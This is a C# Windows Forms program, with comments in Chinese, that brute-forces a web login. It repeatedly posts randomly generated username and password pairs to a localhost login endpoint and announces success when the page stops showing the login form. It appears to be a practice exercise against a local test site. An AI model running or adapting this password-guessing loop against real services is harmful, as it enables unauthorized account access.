using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace 网络简单登录破解2
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            string url = "http://localhost:12345/jd/Login/Login";
              //创建http链接
            var request = (HttpWebRequest)WebRequest.Create(url);
            var response = (HttpWebResponse)request.GetResponse();
            Stream stream = response.GetResponseStream();
            StreamReader sr = new StreamReader(stream);
            string content = sr.ReadToEnd();
            webBrowser1.DocumentText = content;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            var url = "http://localhost:12345/jd/Login/Index";
            string prev = string.Empty;
            for (int i = 0; i < 1100; i++)
            {
                var username = new Random(DateTime.Now.Millisecond).Next(8, 19).ToString();
                Thread.Sleep(2);
                var password = new Random(DateTime.Now.Millisecond).Next(8, 19).ToString();
                //post提交的内容
                var content = "username=" + username + "&password=" + password;
                var bytes = Encoding.UTF8.GetBytes(content);
                var request = (HttpWebRequest)WebRequest.Create(url);
                //根据fiddler中查看到的提交信息，我们也试着模拟追加此类信息然后提交
                request.Method = WebRequestMethods.Http.Post;
                request.Timeout = 1000 * 60;
                request.AllowAutoRedirect = true;
                request.ContentLength = bytes.Length;
                request.ContentType = "application/x-www-form-urlencoded";

                //将content写入post请求中
                var stream = request.GetRequestStream();
                stream.Write(bytes, 0, bytes.Length);
                stream.Close();

                //写入成功，获取请求流
                var response = (HttpWebResponse)request.GetResponse();
                var sr = new StreamReader(response.GetResponseStream());
                var next = sr.ReadToEnd();
                if (string.IsNullOrEmpty(prev))
                {
                    prev = next;
                }
                else
                {
                    if (prev != next&&!next.Contains(" <input type=\"text\" id=\"name\" />"))
                    {
                        webBrowser2.DocumentText = next;
                        MessageBox.Show("恭喜你，密码已经破解！一共花费：" + (i + 1) + "次，用户名为：" + username + ",密码为：" + password);
                        return;
                    }
                }
                webBrowser2.DocumentText = "不好意思，未能破解"+DateTime.Now;
            }
        }
    }
}
